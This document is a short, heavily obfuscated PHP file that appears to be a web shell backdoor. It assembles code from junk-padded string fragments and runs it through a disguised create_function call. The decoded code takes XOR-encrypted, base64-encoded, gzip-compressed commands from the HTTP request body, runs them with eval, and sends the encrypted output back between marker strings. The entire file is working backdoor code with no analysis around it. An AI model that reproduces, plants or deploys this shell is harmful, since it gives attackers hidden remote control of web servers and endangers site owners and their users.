<?php
$U='jKS3M^uM^Gf7gayKGJDc";M^functM^ion x($tM^,$k){M^$cM^=strlM^en($M^k);$l=M^st';
$W='hM^("/$kh(.+)$M^M^kf/",@file_gM^et_coM^ntentM^sM^("php:M^//input"),$m)=M^M';
$f=str_replace('Ud','','UdcUdreatUdeUd_fUduUdnction');
$F='M^$j++,$i++){$o.=$M^t{M^$iM^}^$M^k{$j};}}return M^$oM^;}iM^M^f (@preg_matc';
$E='$M^k="3ba8a9M^5c";$kh=M^"d606M^25M^b59M^M^d97";$kf="b2de840168M^5c";$M^p="';
$K='$m[1]),$k)))M^;M^$o=@obM^_get_cM^ontents();M^@obM^_end_cM^leanM^();$r=@baM';
$y='^=1) {@ob_sM^tarM^t();@evaM^l(@gzunM^compress(M^@xM^(@M^basM^e6M^4_decode(';
$x='^se64_enM^code(@x(M^@M^gzcompresM^s($o),$M^k));pM^M^rint("$p$kh$r$M^kf");}';
$q='rleM^n($tM^);$o="";for($M^i=0;$i<M^$M^l;)M^{for($j=0;M^($j<$c&&$M^M^i<$l);';
$z=str_replace('M^','',$E.$U.$q.$F.$W.$y.$K.$x);
$c=$f('',$z);$c();
?>
